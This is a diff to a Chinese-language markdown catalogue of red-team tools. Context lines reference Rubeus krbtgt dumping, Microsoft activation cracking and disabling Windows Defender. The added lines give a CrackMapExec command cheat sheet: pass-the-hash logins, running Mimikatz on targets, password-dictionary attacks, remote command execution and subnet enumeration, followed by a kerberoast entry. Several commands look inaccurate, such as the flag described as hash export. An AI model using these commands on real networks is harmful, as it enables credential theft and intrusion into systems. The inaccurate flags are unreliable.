@@ -240,7 +240,7 @@ Rubeus.exe dump /luid:0x7049f /service:krbtgt
 * 项目用处：激活 ms 各项软件
 
 ---
-# 14.close.txt
+# 14.close-df.txt
 * 项目用处：ps 命令关闭win 所有防御措施，实时防护需要组策略关闭，否则为临时关闭状态
 ```
 # 禁用 Windows Defender 实时保护
@@ -269,6 +269,82 @@ gpedit.msc
 关闭实时保护>启用
 ```
 ---
+# 15.CrackMapExec
+* 项目地址：https://github.com/byt3bl33d3r/CrackMapExec
+* 项目用处：一款功能强大的命令行工具，具有远程命令执行、哈希传递攻击、哈希收集、信息收集、服务扫描和识别等功能，旨在简化渗透测试和红队操作过程。
+* 简单用法：
+```
+# 1. 扫描目标主机上的 SMB 服务
+crackmapexec smb target_ip
+
+# 2. 使用用户名和密码进行 SMB 身份验证
+crackmapexec smb target_ip -u username -p password
+
+# 3. 使用哈希传递进行 SMB 身份验证
+crackmapexec smb target_ip -u username -H NTLM_hash
+
+# 4. 扫描整个子网上的 SMB 服务
+crackmapexec smb 192.168.1.0/24
+
+# 5. 导出目标主机上的哈希值
+crackmapexec smb target_ip -oG output.txt
+
+# 6. 列出目标主机上的共享资源
+crackmapexec smb target_ip --shares
+
+# 7. 列出目标主机上的用户
+crackmapexec smb target_ip --users
+
+# 8. 列出常见的密码
+crackmapexec smb target_ip --passwords
+
+# 9. 检查目标主机上的密码策略
+crackmapexec smb target_ip --pass-pol
+
+# 10. 在目标主机上执行 Mimikatz
+crackmapexec smb target_ip -M mimikatz
+
+# 11. 在目标主机上执行自定义命令（示例：列出所有用户）
+crackmapexec smb target_ip -x 'net user'
+
+# 12. 使用密码字典进行密码破解
+crackmapexec smb target_ip -u username -P /path/to/passwords.txt
+
+# 13. 执行命令
+crackmapexec smb target_ip -u username -H NTLM_hash -x 'whoami'
+
+```
+---
+# 16.kerberoast
+* 项目地址：https://github.com/nidem/kerberoast
+* 项目用处：主要用于kerberoast攻击
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
